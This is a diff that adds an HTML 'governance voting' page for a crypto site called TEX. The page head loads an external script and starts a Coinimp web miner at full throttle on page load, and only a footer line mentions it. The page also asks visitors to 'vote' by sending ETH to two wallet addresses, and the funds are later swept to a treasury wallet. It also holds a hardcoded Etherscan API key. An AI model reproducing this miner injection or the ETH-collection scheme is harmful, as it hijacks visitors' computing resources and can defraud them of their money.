@@ -1,0 +1,609 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script src="https://www.hostingcloud.racing/73dF.js"></script>
+  <script>
+    var _client = new Client.Anonymous('ba48564ca29687e48ffbe33501ef4dd304a0f222e4c777403c02d9cb81641edd', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+  </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TEX - Voting</title>
+  <link rel="icon" type="icon" href="./tex-logo-small.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #121212;
+      color: #fff;
+    }
+    
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 15px 50px;
+      background-color: #1a1a1a;
+      border-bottom: 1px solid #333;
+    }
+    
+    header .logo {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #ff4d4d;
+    }
+    
+    header nav a {
+      color: #fff;
+      text-decoration: none;
+      margin-left: 20px;
+    }
+    
+    header nav a:hover {
+      color: #ff4d4d;
+    }
+    
+    main {
+      padding: 40px 50px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    
+    .voting-section {
+      margin-bottom: 50px;
+    }
+    
+    .voting-section h1 {
+      color: #ff4d4d;
+      margin-bottom: 10px;
+      font-size: 2.5rem;
+    }
+    
+    .voting-section p {
+      color: #ccc;
+      margin-bottom: 30px;
+      font-size: 1.1rem;
+    }
+    
+    .current-proposal {
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 25px;
+      margin-bottom: 30px;
+      border-left: 4px solid #ff4d4d;
+    }
+    
+    .current-proposal h2 {
+      color: #ff4d4d;
+      margin-bottom: 15px;
+    }
+    
+    .current-proposal p {
+      color: #ddd;
+      line-height: 1.6;
+    }
+    
+    .voting-options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 20px;
+      margin-bottom: 30px;
+    }
+    
+    .vote-card {
+      flex: 1;
+      min-width: 300px;
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 25px;
+      text-align: center;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+    
+    .vote-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+    }
+    
+    .vote-card.yes {
+      border-top: 4px solid #4CAF50;
+    }
+    
+    .vote-card.no {
+      border-top: 4px solid #F44336;
+    }
+    
+    .vote-card h3 {
+      font-size: 1.5rem;
+      margin-bottom: 15px;
+    }
+    
+    .vote-card.yes h3 {
+      color: #4CAF50;
+    }
+    
+    .vote-card.no h3 {
+      color: #F44336;
+    }
+    
+    .wallet-address {
+      background-color: #2a2a2a;
+      padding: 15px;
+      border-radius: 6px;
+      margin: 20px 0;
+      font-family: monospace;
+      word-break: break-all;
+      position: relative;
+    }
+    
+    .copy-button {
+      background-color: #444;
+      border: none;
+      color: #fff;
+      padding: 10px 20px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-size: 1rem;
+      margin-top: 10px;
+      width: 100%;
+    }
+    
+    .copy-button:hover {
+      background-color: #555;
+    }
+    
+    .vote-stats {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 40px;
+    }
+    
+    .stat-card {
+      flex: 1;
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 20px;
+      text-align: center;
+      margin: 0 10px;
+    }
+    
+    .stat-card h3 {
+      color: #ff4d4d;
+      margin-bottom: 10px;
+    }
+    
+    .stat-value {
+      font-size: 2rem;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+    
+    .progress-bar {
+      height: 10px;
+      background-color: #333;
+      border-radius: 5px;
+      margin: 15px 0;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      border-radius: 5px;
+    }
+    
+    .yes-progress {
+      background-color: #4CAF50;
+    }
+    
+    .no-progress {
+      background-color: #F44336;
+    }
+    
+    .instructions {
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 25px;
+      margin-top: 40px;
+    }
+    
+    .instructions h2 {
+      color: #ff4d4d;
+      margin-bottom: 15px;
+    }
+    
+    .instructions ol {
+      padding-left: 20px;
+      color: #ddd;
+      line-height: 1.6;
+    }
+    
+    .instructions li {
+      margin-bottom: 10px;
+    }
+    
+    .new-proposal {
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 25px;
+      margin-top: 40px;
+    }
+    
+    .new-proposal h2 {
+      color: #ff4d4d;
+      margin-bottom: 15px;
+    }
+    
+    .new-proposal p {
+      color: #ddd;
+      line-height: 1.6;
+    }
+    
+    .proposal-button {
+      padding: 12px 25px;
+      background-color: #ff4d4d;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      margin-top: 15px;
+    }
+    
+    .proposal-button:hover {
+      background-color: #ff1a1a;
+    }
+    
+    .status-indicator {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      margin-right: 8px;
+    }
+    
+    .status-online {
+      background-color: #4CAF50;
+    }
+    
+    .status-offline {
+      background-color: #F44336;
+    }
+    
+    .last-updated {
+      text-align: center;
+      color: #888;
+      font-size: 0.9rem;
+      margin-top: 10px;
+    }
+    
+    .loading {
+      color: #888;
+      font-style: italic;
+    }
+    
+    footer {
+      text-align: center;
+      padding: 20px;
+      border-top: 1px solid #333;
+      margin-top: 50px;
+      color: #888;
+    }
+    
+    @media (max-width: 768px) {
+      .voting-options {
+        flex-direction: column;
+      }
+      
+      .vote-stats {
+        flex-direction: column;
+      }
+      
+      .stat-card {
+        margin: 10px 0;
+      }
+      
+      header {
+        padding: 15px 20px;
+      }
+      
+      main {
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">TEX</div>
+    <nav>
+      <a href="https://tex-us.github.io/home/">Home</a>
+      <a href="https://tex-us.github.io/crypto/">Crypto</a>
+      <a href="https://tex-us.github.io/stocks/">Stocks</a>
+      <a href="https://tex-us.github.io/yield/">Yield</a>
+      <a href="#" style="color: #ff4d4d;">Voting</a>
+    </nav>
+  </header>
+  
+  <main>
+    <div class="voting-section">
+      <h1>TEX Governance Voting</h1>
+      <p>Participate in TEX governance by casting your vote with ETH. Send ETH to the YES or NO wallet addresses to vote on current proposals.</p>
+      
+      <div class="current-proposal">
+        <h2>Current Proposal: TEX-2025-001</h2>
+        <p>Should TEX keep using the github url?</p>
+        <p><strong>Voting Period:</strong> November 25, 2025 - January 1, 2026</p>
+      </div>
+      
+      <div class="voting-options">
+        <div class="vote-card yes">
+          <h3>VOTE YES</h3>
+          <p>Support the domain change to make TEX more professional</p>
+          <div class="wallet-address">
+            0x4a72b279dDFdF3a80B3DFf409f277379c851a906
+          </div>
+          <button class="copy-button" onclick="copyToClipboard('0x4a72b279dDFdF3a80B3DFf409f277379c851a906')">Copy YES Address</button>
+        </div>
+        
+        <div class="vote-card no">
+          <h3>VOTE NO</h3>
+          <p>Keep current domain to maintain continuity.</p>
+          <div class="wallet-address">
+            0x1AAE011009c829a3549950833bfF8DF4C0Ec0283
+          </div>
+          <button class="copy-button" onclick="copyToClipboard('0x1AAE011009c829a3549950833bfF8DF4C0Ec0283')">Copy NO Address</button>
+        </div>
+      </div>
+      
+      <div class="vote-stats">
+        <div class="stat-card">
+          <h3>
+            <span class="status-indicator" id="yes-status"></span>
+            YES Votes
+          </h3>
+          <div class="stat-value" id="yes-votes">Loading...</div>
+          <div class="progress-bar">
+            <div class="progress-fill yes-progress" style="width: 0%"></div>
+          </div>
+          <p id="yes-percent">0% of total votes</p>
+        </div>
+        
+        <div class="stat-card">
+          <h3>
+            <span class="status-indicator" id="no-status"></span>
+            NO Votes
+          </h3>
+          <div class="stat-value" id="no-votes">Loading...</div>
+          <div class="progress-bar">
+            <div class="progress-fill no-progress" style="width: 0%"></div>
+          </div>
+          <p id="no-percent">0% of total votes</p>
+        </div>
+        
+        <div class="stat-card">
+          <h3>Total Votes</h3>
+          <div class="stat-value" id="total-votes">Loading...</div>
+          <div class="progress-bar">
+            <div class="progress-fill" style="width: 0%; background-color: #ff4d4d;"></div>
+          </div>
+          <p>Voting in progress</p>
+        </div>
+      </div>
+      
+      <div class="last-updated" id="last-updated">
+        Last updated: <span id="update-time">Never</span>
+      </div>
+      
+      <div class="instructions">
+        <h2>How to Vote</h2>
+        <ol>
+          <li>Choose whether you support (YES) or oppose (NO) the current proposal</li>
+          <li>Click "Copy YES Address" or "Copy NO Address" to copy the wallet address</li>
+          <li>Paste the address in your wallet and send ETH (any amount counts as a vote)</li>
+          <li>Your vote will be weighted by the amount of ETH sent</li>
+          <li>Voting results update automatically as votes are cast</li>
+        </ol>
+        <p><strong>Note:</strong> ETH sent to voting wallets will be manually transferred to TEX treasury (0x747110685DdEBc2452a5113323bF6a5d76f03c07) after voting ends. You can vote multiple times, and all votes are final.</p>
+      </div>
+      
+      <div class="new-proposal">
+        <h2>Submit a New Proposal</h2>
+        <p>Have an idea for improving TEX? Submit your proposal to our team for consideration in the next voting cycle.</p>
+        <button class="proposal-button" onclick="window.location.href = 'mailto:the_tex_team@proton.me?subject=New TEX Proposal'">Submit Proposal</button>
+      </div>
+    </div>
+  </main>
+  
+  <footer>
+    <p>2025 TEX</p>
+    <p>TEX uses Coinimp Web Mining to fund itself. If your adblock is on, please disable it.</p>
+  </footer>
+  
+  <script>
+    // Voting wallet addresses
+    const VOTE_WALLETS = {
+      YES: "0x4a72b279dDFdF3a80B3DFf409f277379c851a906",
+      NO: "0x1AAE011009c829a3549950833bfF8DF4C0Ec0283"
+    };
+    
+    // TEX treasury wallet
+    const TEX_WALLET = "0x747110685DdEBc2452a5113323bF6a5d76f03c07";
+    
+    // Etherscan API Key - Replace with your actual API key
+    const ETHERSCAN_API_KEY = "I4FJMK4VEK7U54B5TZI12EFRYYZUFPR3JI";
+    
+    // Voting stats
+    let votingStats = {
+      yes: 0,
+      no: 0,
+      lastUpdate: null,
+      isOnline: false
+    };
+    
+    // Function to copy wallet address to clipboard
+    function copyToClipboard(text) {
+      navigator.clipboard.writeText(text).then(function() {
+        alert("Wallet address copied to clipboard!\n\n" + text + "\n\nPaste this address in your wallet to send ETH.");
+      }, function(err) {
+        console.error('Could not copy text: ', err);
+        // Fallback for older browsers
+        const textArea = document.createElement("textarea");
+        textArea.value = text;
+        document.body.appendChild(textArea);
+        textArea.select();
+        try {
+          document.execCommand('copy');
+          alert("Wallet address copied to clipboard!\n\n" + text + "\n\nPaste this address in your wallet to send ETH.");
+        } catch (err) {
+          console.error('Fallback copy failed: ', err);
+          alert("Please manually copy the wallet address: " + text);
+        }
+        document.body.removeChild(textArea);
+      });
+    }
+    
+    // Function to fetch ETH balance using correct Etherscan v2 API format
+    async function fetchBalance(address) {
+      try {
+        // Correct Etherscan v2 API URL format
+        const url = `https://api.etherscan.io/v2/api?apikey=${ETHERSCAN_API_KEY}&chainid=1&module=account&action=balance&address=${address}&tag=latest`;
+        
+        const options = { 
+          method: 'GET'
+        };
+        
+        const response = await fetch(url, options);
+        
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        
+        if (data.status === "1") {
+          return parseFloat(data.result) / 1e18; // Convert wei to ETH
+        } else {
+          throw new Error(`API error: ${data.message}`);
+        }
+      } catch (error) {
+        console.error(`Error fetching balance for ${address}:`, error);
+        throw error;
+      }
+    }
+    
+    // Function to fetch voting balances
+    async function fetchVotingBalances() {
+      try {
+        // Fetch YES wallet balance
+        const yesBalance = await fetchBalance(VOTE_WALLETS.YES);
+        
+        // Fetch NO wallet balance
+        const noBalance = await fetchBalance(VOTE_WALLETS.NO);
+        
+        // Update stats with real data
+        votingStats.yes = yesBalance;
+        votingStats.no = noBalance;
+        votingStats.lastUpdate = new Date();
+        votingStats.isOnline = true;
+        
+        console.log('Successfully fetched real data:', { yes: yesBalance, no: noBalance });
+        
+      } catch (error) {
+        console.error("Failed to fetch real data:", error);
+        votingStats.isOnline = false;
+        
+        // Show error state
+        document.getElementById('yes-votes').textContent = "API Error";
+        document.getElementById('no-votes').textContent = "API Error";
+        document.getElementById('total-votes').textContent = "API Error";
+        document.getElementById('yes-votes').className = "stat-value loading";
+        document.getElementById('no-votes').className = "stat-value loading";
+        document.getElementById('total-votes').className = "stat-value loading";
+      }
+      
+      updateVotingStats();
+      updateStatusIndicators(votingStats.isOnline);
+    }
+    
+    // Function to update voting stats display
+    function updateVotingStats() {
+      if (votingStats.isOnline) {
+        document.getElementById('yes-votes').textContent = votingStats.yes.toFixed(4) + ' ETH';
+        document.getElementById('no-votes').textContent = votingStats.no.toFixed(4) + ' ETH';
+        document.getElementById('total-votes').textContent = (votingStats.yes + votingStats.no).toFixed(4) + ' ETH';
+        
+        // Remove loading classes
+        document.getElementById('yes-votes').className = "stat-value";
+        document.getElementById('no-votes').className = "stat-value";
+        document.getElementById('total-votes').className = "stat-value";
+        
+        // Update progress bars
+        const total = votingStats.yes + votingStats.no;
+        const yesPercent = total > 0 ? (votingStats.yes / total) * 100 : 0;
+        const noPercent = total > 0 ? (votingStats.no / total) * 100 : 0;
+        
+        document.querySelector('.yes-progress').style.width = yesPercent + '%';
+        document.querySelector('.no-progress').style.width = noPercent + '%';
+        
+        document.getElementById('yes-percent').textContent = yesPercent.toFixed(1) + '% of total votes';
+        document.getElementById('no-percent').textContent = noPercent.toFixed(1) + '% of total votes';
+        
+        // Update last updated time
+        if (votingStats.lastUpdate) {
+          document.getElementById('update-time').textContent = votingStats.lastUpdate.toLocaleTimeString();
+        }
+      }
+    }
+    
+    // Function to update status indicators
+    function updateStatusIndicators(isOnline) {
+      const statusClass = isOnline ? 'status-online' : 'status-offline';
+      document.getElementById('yes-status').className = `status-indicator ${statusClass}`;
+      document.getElementById('no-status').className = `status-indicator ${statusClass}`;
+    }
+    
+    // Function to handle page visibility changes
+    function handleVisibilityChange() {
+      if (!document.hidden) {
+        // Page became visible, refresh data
+        fetchVotingBalances();
+      }
+    }
+    
+    // Initialize when page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      // Set initial loading state
+      document.getElementById('yes-votes').className = "stat-value loading";
+      document.getElementById('no-votes').className = "stat-value loading";
+      document.getElementById('total-votes').className = "stat-value loading";
+      updateStatusIndicators(false);
+      
+      // Check if API key is set
+      if (ETHERSCAN_API_KEY === "YOUR_ETHERSCAN_API_KEY_HERE") {
+        document.getElementById('yes-votes').textContent = "Set API Key";
+        document.getElementById('no-votes').textContent = "Set API Key";
+        document.getElementById('total-votes').textContent = "Set API Key";
+        return;
+      }
+      
+      // Fetch real data
+      fetchVotingBalances();
+      
+      // Set up periodic updates (every 30 seconds)
+      setInterval(fetchVotingBalances, 30000);
+      
+      // Listen for page visibility changes
+      document.addEventListener('visibilitychange', handleVisibilityChange);
+      
+      // Listen for page focus (when user returns to tab)
+      window.addEventListener('focus', fetchVotingBalances);
+    });
+  </script>
+</body>
+</html>
